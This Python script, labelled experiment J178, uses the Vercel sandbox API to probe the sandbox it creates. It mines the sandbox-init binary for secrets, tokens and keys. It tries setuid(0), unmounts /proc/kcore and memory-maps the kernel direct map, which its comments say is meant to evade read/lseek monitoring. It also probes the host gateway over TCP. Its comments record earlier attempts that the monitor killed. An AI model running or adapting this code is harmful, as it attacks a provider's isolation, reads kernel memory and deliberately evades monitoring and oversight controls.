# 实验J178: sandbox-init 二进制 strings 分析 + kcore mmap 绕过测试
# j177: init.sock 0600/uid1000 可连但连接即被杀; text段32MB随便读, direct map被监控
# 本步: 1)strings sandbox-init 提取协议/URL/密钥线索
#       2)mmap 映射 kcore direct map 区域(缺页读取绕过read/lseek检测)
#       3)默认策略下 TCP 探测网关(单个连接测试是否被杀)
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=8000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj178"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# PA: strings sandbox-init (grep 关键词)
PA = r'''
import os, re
out = open("/tmp/d178a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
try:
    d = open("/run/vercel/share/sandbox-init", "rb").read()
    p("size", len(d))
    # 提取可打印字符串 (>=5)
    strs = re.findall(rb"[\x20-\x7e]{5,}", d)
    p("nstrings", len(strs))
    pats = [b"http", b"token", b"secret", b"private", b"vercel", b"socket",
            b"command", b"auth", b"sign", b"pubkey", b"ed25519", b"nonce",
            b"control", b"api.", b"wss", b"tls", b"password", b"credential"]
    seen = set()
    for s in strs:
        low = s.lower()
        if any(pa in low for pa in pats):
            key = s[:60]
            if key in seen:
                continue
            seen.add(key)
            p("STR", s[:200])
    p("nmatched", len(seen))
except Exception as ex:
    p("strs_err", repr(ex))
p("done")
out.close()
'''

# PB: kcore mmap 测试 (direct map 区域)
PB = r'''
import os, ctypes, struct, mmap
out = open("/tmp/d178b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL("libc.so.6", use_errno=True)
if os.getuid() != 0:
    libc.setuid(0)
libc.umount(b"/proc/kcore")
fd = os.open("/proc/kcore", os.O_RDONLY)
def rd_at(off, n):
    pos = os.lseek(fd, off, 0)
    if pos != off:
        return b""
    return os.read(fd, n)

head = rd_at(0, 64)
e_phoff = struct.unpack("<Q", head[32:40])[0]
e_phentsize = struct.unpack("<H", head[54:56])[0]
e_phnum = struct.unpack("<H", head[56:58])[0]
segs = []
for i in range(e_phnum):
    off = e_phoff + i * e_phentsize
    h = rd_at(off, 56)
    if len(h) < 56:
        break
    p_type = struct.unpack("<I", h[0:4])[0]
    if p_type != 1:
        continue
    p_offset = struct.unpack("<Q", h[8:16])[0]
    p_vaddr = struct.unpack("<Q", h[16:24])[0]
    p_filesz = struct.unpack("<Q", h[32:40])[0]
    segs.append((p_offset, p_vaddr, p_filesz))
p("segs", len(segs))

# 找 direct map 3GB 段
dm = None
for off0, vaddr, fsz in segs:
    if 0xffff888000000000 <= vaddr < 0xffff888100000000 and fsz > 0x40000000:
        dm = (off0, vaddr, fsz)
        break
p("dm", dm)
if dm:
    off0, vaddr, fsz = dm
    # mmap 映射前 16MB (从文件偏移 off0 开始)
    try:
        length = 16 * 1024 * 1024
        m = mmap.mmap(fd, length, access=mmap.ACCESS_READ, offset=off0)
        p("MMAP_OK", "len", length)
        # 访问几个位置触发缺页
        for probe_off in [0, 4096, 65536, 1024 * 1024]:
            try:
                b = m[probe_off:probe_off + 16]
                p("MAP_READ", probe_off, b.hex())
            except Exception as ex:
                p("MAP_READ_EXC", probe_off, repr(ex))
        # 全量顺序读 16MB (触发缺页序列)
        total = 0
        pos = 0
        while pos < length:
            d = m[pos:pos + 4096]
            total += len(d)
            pos += len(d)
        p("MAP_SCANNED", total)
        m.close()
    except Exception as ex:
        p("MMAP_EXC", repr(ex))
p("done")
os.close(fd)
p("=== B_DONE")
out.close()
'''

# PC: 默认策略 TCP 探测网关(单个连接)
PC = r'''
import os, socket
out = open("/tmp/d178c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
for target in [("127.0.0.1", 30001), ("100.64.0.1", 80), ("100.64.0.1", 443),
               ("100.64.0.1", 8080), ("100.64.0.1", 3000)]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(target)
        p("TCP_OK", target[0], target[1])
        try:
            s.send(b"GET / HTTP/1.0\r\nHost: x\r\n\r\n")
            d = s.recv(512)
            p("TCP_DATA", target[0], target[1], d[:200])
        except Exception as ex:
            p("TCP_DATA_EXC", target[0], target[1], repr(ex))
        s.close()
    except Exception as ex:
        p("TCP_EXC", target[0], target[1], repr(ex)[:120])
    out.flush()
p("done")
out.close()
'''

steps = [
    ("strings", "/tmp/d178a.txt", PA),
    ("mmap", "/tmp/d178b.txt", PB),
    ("tcp", "/tmp/d178c.txt", PC),
]
for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=280)
    time.sleep(2)
    cf = catfile(sid, marker, f"marker[{label}]", 8000)
    if st == "DEAD" or cf == 410:
        print(f"\n!!! DEATH after cmd[{label}] -> trigger = {label}", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
